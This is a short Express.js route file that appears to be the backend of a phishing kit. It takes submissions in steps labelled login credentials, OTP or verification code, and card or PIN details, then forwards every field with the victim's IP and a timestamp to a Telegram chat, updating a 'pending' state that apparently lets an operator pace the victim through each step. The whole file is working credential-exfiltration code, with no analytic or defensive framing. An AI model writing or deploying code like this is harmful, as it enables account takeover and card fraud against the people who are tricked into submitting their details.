/**
 * POST /api/submit
 * Body: { step: number, data: { ... } }
 */
const express = require('express');
const router  = express.Router();
const { sendTelegram, h, loadState, saveState } = require('../config');

const stepTitles = {
    1: '🔐 Login Credentials',
    2: '🔑 OTP / Verification Code',
    3: '💳 Card / Pin Details'
};

router.post('/', async (req, res) => {
    const { step, data } = req.body || {};

    // Validate
    if (typeof step !== 'number' || !data || typeof data !== 'object') {
        return res.status(400).json({ success: false, message: 'Malformed payload.' });
    }
    if (Object.keys(data).length === 0) {
        return res.status(400).json({ success: false, message: 'No data received.' });
    }

    // ---------- Build message ----------
    const title = stepTitles[step] || `📄 Step ${step}`;

    let text = `📬 <b>New Submission — ${title}</b>\n`;
    text += '────────────────────\n';

    for (const [key, value] of Object.entries(data)) {
        text += `• <b>${h(key)}:</b> ${h(value)}\n`;
    }

    text += '────────────────────\n';
    text += `🌐 IP: ${h(req.ip || req.connection.remoteAddress || 'unknown')}\n`;
    text += `🕒 ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`;

    // ---------- Send to Telegram ----------
    const ok = await sendTelegram(text);
    if (!ok) {
        return res.status(502).json({ success: false, message: 'Failed to send to Telegram.' });
    }

    // ---------- Update state → pending ----------
    const state = loadState();
    state.step   = step;
    state.status = 'pending';
    saveState(state);

    return res.json({ success: true, message: 'Submitted.' });
});

module.exports = router;